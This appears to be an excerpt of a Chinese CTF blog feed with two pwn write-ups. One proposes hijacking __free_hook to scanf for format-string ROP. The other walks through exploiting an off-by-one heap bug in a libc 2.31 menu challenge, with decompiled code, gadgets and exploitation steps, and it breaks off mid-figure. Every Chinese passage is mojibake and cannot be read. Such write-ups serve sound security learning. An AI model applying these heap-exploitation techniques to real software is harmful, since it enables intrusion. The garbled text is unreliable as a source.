    <content type="html"><![CDATA[<p>ä¸€åˆ‡éƒ½æºäºæŸä¸ªä¸­åˆçš„çªå‘å¥‡æƒ³~</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/195106/24/27337/22482/631163bdE235b1360/0af342924109996b.png" style="zoom:80%;" /><span id="more"></span><h2 id="æƒ³æ³•"><a href="#æƒ³æ³•" class="headerlink" title="æƒ³æ³•"></a>æƒ³æ³•</h2><p>ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨è¾ƒä½çš„<code>libc</code>ç‰ˆæœ¬ï¼ˆ2.34ä¹‹å‰ï¼‰ä¸‹è¿›è¡Œ<code>orw</code>åˆ©ç”¨ä¸€èˆ¬æ˜¯æŠŠ<code>__free_hook</code>åŠ«æŒä¸º<code>setcontext</code>è¿›è¡Œæ ˆè¿ç§»ï¼ˆç°åœ¨è¿˜éœ€è¦è·³æ¿<code>gadget</code>å®Œæˆ<code>rdx</code>åˆ°<code>rdi</code>çš„è½¬å˜ï¼‰ï¼Œå †çš„å„é¡¹å¸ƒå±€å¯¹äºæˆ‘è¿™ä¸ªæƒ³å¯„å°±å¯„çš„èœé¸Ÿæ¥è¯´çœŸæ˜¯å¿ƒåŠ›æ†”æ‚´ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/128154/12/29279/36057/63116848Ea2f34b05/b991a211c9e5b641.jpg" style="zoom: 33%;" /><p>è½¬å¿µä¸€æƒ³<code>free(buf)</code>ä¸­çš„<code>buf</code>æ˜¯äººä¸ºå¯æ§çš„ï¼Œ<code>free</code>ä¹Ÿå¯ä»¥ç”±<code>__free_hook</code>è¢«åŠ«æŒä¸ºæŸä¸ªå‡½æ•°ã€‚åˆšå¥½å½“æ—¶å›½èµ›å‡ºé¢˜å‡ºçš„å°±æ˜¯æœ‰å…³æ ¼å¼åŒ–å­—ç¬¦ä¸²<code>printf</code>å’Œ<code>scanf</code>çš„æ¼æ´åˆ©ç”¨ï¼Œå°±æœ‰äº†è¿™æ ·çš„æƒ³æ³•â€”â€”<code>free(buf)</code>===&gt;<code>scanf(buf)</code>ï¼Œå…¶ä¸­<code>buf</code>å †å—ä¸­å­˜æ”¾ç€<code>%n$s</code>æ¥å¯¹å‡†<code>rbp</code>é“¾åœ¨å‡½æ•°è¿”å›åœ°å€å¤„ç›´æ¥æ„é€ <code>orw</code>ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/47026/25/21037/41527/63116b98Eb9f9e80a/f3f24576b5844d4a.jpg" style="zoom: 25%;" /><h2 id="scanfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"><a href="#scanfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´" class="headerlink" title="scanfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´"></a>scanfæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</h2><p>åˆ©ç”¨<code>scanf(%n$s)</code>å¯ä»¥å¯¹åç§»ä¸º<code>n</code>çš„æ ˆä¸Š<strong>æŒ‡é’ˆ</strong>æŒ‡å‘å¤„è¿›è¡Œ<strong>ä»»æ„é•¿åº¦</strong>çš„è¾“å…¥ã€‚å¸¸è§åˆ©ç”¨æ‰‹æ³•æœ‰ï¼š</p><ol><li>æ ˆä¸Šè‹¥æ®‹ç•™<code>IO</code>æŒ‡é’ˆå¯è¿›è¡Œ<code>IO_ATTACK</code>æ³„éœ²<code>libc</code></li><li>åˆ©ç”¨<code>rbp</code>é“¾æ„é€ <code>rop</code>ï¼Œç›´æ¥é¿å¼€äº†<code>rbp</code>é“¾å‰çš„<code>canary</code></li></ol><h2 id="è¯•éªŒ"><a href="#è¯•éªŒ" class="headerlink" title="è¯•éªŒ"></a>è¯•éªŒ</h2><p>äºæ˜¯å…´è‡´å‹ƒå‹ƒåœ°è·‘å»ç”¨<a href="https://anza2001.github.io/2022/08/14/off-by-one/">ä¸Šæ¬¡åˆšå¤ç›˜è¿‡çš„é¢˜ç›®</a>è¿›è¡Œè¯•éªŒï¼š</p><p>ä¸‹å›¾ä¸ºå·²åŠ«æŒ<code>__free_hook</code>ä¸º<code>scanf</code>ï¼Œæ­£åœ¨å°è¯•æ‰§è¡Œ<code>scanf(&#39;%8$s&#39;)</code>æ“ä½œï¼ˆ8ä¸º<code>rbp</code>é“¾çš„åç§»ï¼‰ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/192749/27/27723/89623/63117202E1841821f/2f6f248266f3fff7.png" style="zoom:80%;" /><p>é€äº›åƒåœ¾æ•°æ®è¿‡å»ï¼Œçœ‹ä¸€ä¸‹æ ˆçš„å˜åŒ–ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/215319/40/20778/119453/631173b3Ea84ff058/050099a11809f7d9.png" style="zoom:80%;" /><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸåˆ©ç”¨<code>rbp</code>é“¾å°†<code>main</code>å‡½æ•°æ ˆçš„è¿”å›åœ°å€ç»™è¦†ç›–ä¸ºäº†<code>anzaanza</code>ï¼ŒåŠ ä¸Š<code>scanf</code>ä¹Ÿä¸ä¼šè¢«<code>\x00</code>æˆªæ–­ï¼Œæ‰€ä»¥ç›´æ¥æ„é€ <code>orw</code>å¹¶ééš¾äº‹ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="ä¼˜ç‚¹"><a href="#ä¼˜ç‚¹" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h3><ol><li><p>çœå»äº†å¯¹å †å—çš„å¸ƒå±€æ“ä½œä»¥åŠå¯»æ‰¾<code>rdx</code>å’Œ<code>rdi</code>è½¬å˜çš„<code>gadget</code>ï¼Œç®€åŒ–ä¸ºåªéœ€è¦çˆ†ç ´å‡ºå›ºå®šåç§»å³å¯ã€‚</p></li><li><p>ä¸Šæ¬¡å¤ç›˜æ—¶æ„Ÿè§‰<code>setcontext</code>å’Œ<code>orw</code>é“¾éœ€è¦åœ¨ä¸€ä¸ªè¾ƒå¤§çš„å †å—ä¸­è¿›è¡Œå¸ƒå±€ï¼Œå¦‚æœæ‰€ç»™å †å—è¾ƒå°çš„è¯ï¼Œå¤§æ¦‚ä¼šæé«˜åˆ©ç”¨çš„å¤æ‚ç¨‹åº¦ï¼ˆç¬¬ä¸€æ¬¡åˆ©ç”¨<code>setcontext</code>è§£é¢˜ï¼Œç»éªŒä¸è¶³ï¼Œå¯èƒ½æ˜¯æ‹™è§ï¼‰ã€‚è€Œ<code>scanf</code>å¯è¾“å…¥ä¸é™é•¿ï¼Œå¯¹å‚æ•°å †å—<code>buf</code>çš„å¤§å°ä¹Ÿä¸åšé™åˆ¶ã€‚</p></li><li><p>å¦‚æœé¢˜ç›®å…è®¸ï¼Œåˆ™å¯ä¸æ–­ç”³è¯·ã€é‡Šæ”¾ï¼Ÿç›¸å½“äºæ— é™æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆä¸è®ºåŠ«æŒä¸º<code>scanf</code>è¿˜æ˜¯<code>printf</code>ï¼‰ï¼Œå¯ä»¥åœ¨æ ˆä¸Šæ„é€ æƒ³è¦çš„åœ°å€ï¼Œç„¶åå¯¹å…¶æŒ‡å‘å¤„è¿›è¡Œä¿®æ”¹ç­‰æ“ä½œï¼Ÿ</p></li></ol><h3 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h3><ol><li>è¯•éªŒè¿‡ç¨‹ä¸­æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨<code>delete</code>åŠŸèƒ½å‡½æ•°ä¸­åˆ©ç”¨<code>scanf</code>æ ¼å¼åŒ–æ¼æ´åˆ©ç”¨åªèƒ½ä¿®æ”¹åˆ°å…¶<strong>çˆ¶å‡½æ•°</strong>å³<code>main</code>å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè€Œè®¸å¤šé¢˜ç›®éƒ½æ˜¯ç›´æ¥<code>exit</code>é€€å‡ºäº†ï¼Œä¸ç»™<code>main</code>å‡½æ•°è¿”å›çš„æœºä¼šã€‚</li><li>ä¼šè¢«<code>\x0a</code>æˆªæ–­ï¼Œå¯¹<code>rop</code>é“¾æœ‰è¦æ±‚ã€‚</li><li>å¤§æ¦‚æ›´é€‚ç”¨äº<code>orw</code>ï¼Œæ¯•ç«Ÿä¸å¼€æ²™ç®±çš„è¯ç›´æ¥æ„é€ <code>system(&#39;/bin/sh&#39;)</code>å°±å¥½ã€‚</li></ol><h3 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h3><p><code>scanf(buf)</code>å’Œ<code>system(buf)</code>éƒ½æ˜¯æ§åˆ¶å‡½æ•°å’Œå…¶ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œåè€…è¢«<code>sandbox</code>ä¹‹åï¼Œå‰è€…è¿˜æœ‰ç”¨æ­¦ä¹‹åœ°ï¼ˆé™¤é<code>orw</code>ç™½åå•ï¼‰ã€‚ä¸çŸ¥èƒ½å¦é…åˆ<code>io_file</code>ä¹‹ç±»çš„åˆ©ç”¨æ‰‹æ³•ï¼Œä»¥åŠæ­é…èµ·æ¥æ˜¯å¦æ¯”åŸè§£æ³•æ›´æ–¹ä¾¿ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¸€åˆ‡éƒ½æºäºæŸä¸ªä¸­åˆçš„çªå‘å¥‡æƒ³~&lt;/p&gt;
&lt;img src=&quot;https://kjimg10.360buyimg.com/ott/jfs/t1/195106/24/27337/22482/631163bdE235b1360/0af342924109996b.png&quot; style=&quot;zoom:80%;&quot; /&gt;</summary>
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>off-by-one</title>
    <link href="http://example.com/2022/08/14/off-by-one/"/>
    <id>http://example.com/2022/08/14/off-by-one/</id>
    <published>2022-08-14T01:07:26.000Z</published>
    <updated>2023-02-01T14:32:42.273Z</updated>
    
    <content type="html"><![CDATA[<p>èµ›å‰å¤ç›˜ä¸€é“<code>libc2.31</code>çš„<code>off-by-one</code>æ¼æ´åˆ©ç”¨çš„é¢˜ç›®ã€‚</p><span id="more"></span><h2 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h2><h3 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h3><p>ç‰¹æ®Šçš„å †æº¢å‡ºæ¼æ´ï¼Œåªæº¢å‡ºä¸€ä¸ªå­—èŠ‚ï¼Œä»è€Œå½±å“ä¸‹ä¸€ä¸ªå †å—çš„å¤´éƒ¨æ§åˆ¶ä¿¡æ¯ï¼Œå³å †å—çš„<code>size</code>ä½ï¼Œåˆ©ç”¨æ€è·¯å¾€å¾€æ˜¯<strong>æ”¹å¤§</strong>ä¸‹ä¸€ä¸ªå †å—çš„<code>size</code>ä½ï¼Œä»è€Œé€ æˆ<strong>å †å—é‡å </strong>(overlapping)ã€‚</p><h3 id="overlapping"><a href="#overlapping" class="headerlink" title="overlapping"></a>overlapping</h3><p>å°†ä¸‹ä¸€ä¸ªå †å—æ”¹å¤§(ä¸€èˆ¬æ”¹æˆ<strong>unsortedbin</strong>çš„å¤§å°)åè¿›è¡Œ<strong>é‡Šæ”¾</strong>ï¼Œåˆ©ç”¨<code>unsortedbin</code>ä¸­å †å—å¯åˆ‡å‰²çš„æ€§è´¨ï¼Œé€ æˆå †å—é‡å ï¼ŒåŒæ—¶å¯ä»¥æ³„éœ²å‡º<code>main_arena+96</code>ã€‚å‚è€ƒå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://m.360buyimg.com/babel/jfs/t1/9162/38/19492/69695/62f87050E2853f706/edc2658491d52f8a.png"></p><h3 id="Gadgetï¼šsetcontext"><a href="#Gadgetï¼šsetcontext" class="headerlink" title="Gadgetï¼šsetcontext"></a>Gadgetï¼šsetcontext</h3><p>é¦–å…ˆæ¥çœ‹ä¸‹<code>libc-2.27.so</code>ä¸­çš„<code>setcontext</code>ï¼š</p><img src="https://m.360buyimg.com/babel/jfs/t1/180383/9/27781/74057/62f87b1dE171bf553/952ab3795b63fd6b.png" style="zoom:80%;" /><p>åªè¦æˆ‘ä»¬æ§åˆ¶ä½<code>rdi</code>å¯„å­˜å™¨ä¸”ä¿è¯<code>rdi+0A0</code>å’Œ<code>rdi+0A8</code>å¤„<strong>äººä¸ºå¯æ§</strong>ï¼Œä¾¿èƒ½æ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚åœ¨<code>rdi+0A8</code>ç”¨<code>ret</code>æŒ‡ä»¤è¿›è¡Œè¦†ç›–ï¼Œ<code>rdi+0A0</code>å¤„æ„é€ <code>ROP</code>é“¾ã€‚è€Œæˆ‘ä»¬é€šå¸¸å°†<code>__free_hook</code>åŠ«æŒä¸º<code>setcontext+53</code>ï¼Œè€Œ<code>free(heap_ptr)</code>å‰ä¼šå°†<code>rdi</code>å†™å…¥<code>heap_ptr</code>ï¼Œå› æ­¤<code>rdi</code>ä¹Ÿå¯æ§ã€‚</p><p>å†æ¥çœ‹ä¸‹<code>libc-2.31.so</code>ä¸­çš„<code>setcontext</code>ï¼š</p><img src="https://m.360buyimg.com/babel/jfs/t1/27026/15/19442/63240/62f87f68E2355543e/3e7fd59d3eb7948a.png" style="zoom:80%;" /><p>æˆ‘ä»¬å‘ç°å¯„å­˜å™¨ç”±<code>rdi</code>æ”¹ä¸ºäº†<code>rdx</code>ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬éœ€è¦å¯»æ‰¾å¦ä¸€ä¸ª<code>gadget</code>ä½œä¸ºè·³æ¿ï¼Œå¦‚ä¸‹ï¼š</p><img src="https://m.360buyimg.com/babel/jfs/t1/164191/21/29805/50170/62f8818aE389bea14/7a9e50a788d86bc3.png" style="zoom:80%;" /><h2 id="èµ›é¢˜è¯¦è§£"><a href="#èµ›é¢˜è¯¦è§£" class="headerlink" title="èµ›é¢˜è¯¦è§£"></a>èµ›é¢˜è¯¦è§£</h2><p>èµ›é¢˜å‡ºè‡ªç¬¬äºŒå±Šå¹¿ä¸œå¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›â€”â€”midpwnã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/pwnpwnpwn/Libc2.31Training/midpwn$ checksec orz</span><br><span class="line">[*] &#x27;/home/fuzz/pwnpwnpwn/Libc2.31Training/midpwn/orz&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="åŸºæœ¬åŠŸèƒ½æ¨¡å—"><a href="#åŸºæœ¬åŠŸèƒ½æ¨¡å—" class="headerlink" title="åŸºæœ¬åŠŸèƒ½æ¨¡å—"></a>åŸºæœ¬åŠŸèƒ½æ¨¡å—</h3><p>å…¸å‹çš„èœå•é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. add new note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. edit a  note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. show a  note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. delte a note.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5. exit        .&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your choose which one?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>add</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *heap; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= size0x20 )<span class="comment">//å †å—ä¸Šé™ä¸º0x20</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = size0x20;</span><br><span class="line">      <span class="keyword">if</span> ( i == size0x20 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;no space left.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heap_ptr + i) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input note size : &quot;</span>);</span><br><span class="line">  size = input();</span><br><span class="line">  <span class="keyword">if</span> ( size != <span class="number">0x28</span> &amp;&amp; size != <span class="number">0xB0</span> )<span class="comment">//åªå…è®¸ç”³è¯·0x28å’Œ0xb0å¤§å°çš„å †å—</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your size is too small or too big.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  heap = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( heap &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(&amp;heap_ptr + i) = heap;</span><br><span class="line">  heap_size[i] = size;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your note.&quot;</span>);</span><br><span class="line">  v3 = read(<span class="number">0</span>, *(&amp;heap_ptr + i), size);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> || v3 &gt; size )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>edit</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *<span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v2 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input new note.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= heap_size[v2]; ++i )<span class="comment">//è¯»å…¥size+1ä¸ªå­—èŠ‚ï¼Œå­˜åœ¨off-by-one</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (heap_ptr[v2] + i), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(heap_ptr[v2] + i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (heap_ptr[v2] + i);</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>show</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, heap_ptr[v1], heap_size[v1]);<span class="comment">//æ‰“å°å †å†…æ•°æ®</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>delete</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input note index.&quot;</span>);</span><br><span class="line">  v1 = input();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= size0x20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker ! out !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(heap_ptr[v1]);</span><br><span class="line">  heap_ptr[v1] = <span class="number">0LL</span>;<span class="comment">//é‡Šæ”¾å †å—ï¼Œå¹¶å°†æŒ‡é’ˆç½®é›¶</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŸºæœ¬æ¼æ´"><a href="#åŸºæœ¬æ¼æ´" class="headerlink" title="åŸºæœ¬æ¼æ´"></a>åŸºæœ¬æ¼æ´</h3><p><code>off-by-one</code>æ¼æ´å­˜åœ¨äº<code>edit</code>åŠŸèƒ½ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= heap_size[v2]; ++i )<span class="comment">//off-by-one</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (heap_ptr[v2] + i), <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( *(heap_ptr[v2] + i) == <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (heap_ptr[v2] + i);</span><br><span class="line">      *result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h3><ol><li>å¡«æ»¡<code>tcache bin</code>ä¸­<code>0xc0</code>å¤§å°çš„å †å—ï¼Œä½¿å¾—ä¸‹ä¸€å—<code>0xc0</code>å¤§å°çš„å †å—è¢«é‡Šæ”¾åä¼šè¿›å…¥<code>unsortedbin</code></li><li>ç”³è¯·6ä¸ª<code>0x31</code>å¤§å°çš„å †å—ï¼ˆç¬¬6ä¸ªå †å—ç”¨äºé˜²æ­¢unsortedbinå¤§å°å †å—çš„åˆå¹¶ï¼‰</li><li>ç”¨ç¬¬1ä¸ªå †å—ä¿®æ”¹ç¬¬äºŒä¸ªå †å—çš„<code>size</code>ä½ä¸º<code>0xc1</code>ï¼Œå†å°†ç¬¬2ä¸ªå †å—é‡Šæ”¾æ‰ï¼Œè¯¥å †å—ä¾¿èƒ½è¿›å…¥<code>unsortedbin</code></li><li>åˆ‡å‰²<code>unsortedbin</code>æ³„éœ²å‡º<code>libc</code>åŸºå€ï¼Œå¹¶é€ æˆå †å—é‡å </li><li>åˆ©ç”¨å †å—é‡å ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹<code>fd</code>å¯ä»¥ç”³è¯·ä¿®æ”¹<code>__free_hook</code>ä¸ºè·³æ¿<code>gadget</code>ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000001518B0                 mov     rdx, [rdi+8]</span><br><span class="line">.text:00000000001518B4                 mov     [rsp+0C8h+var_C8], rax</span><br><span class="line">.text:00000000001518B8                 call    qword ptr [rdx+20h]</span><br></pre></td></tr></table></figure><ol start="6"><li>ç”³è¯·å›ä¸¤ä¸ª<code>0xb0</code>å¤§å°çš„å †å—ï¼Œå¯¹é‡Šæ”¾çš„å †å—æ„é€ å¦‚ä¸‹ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 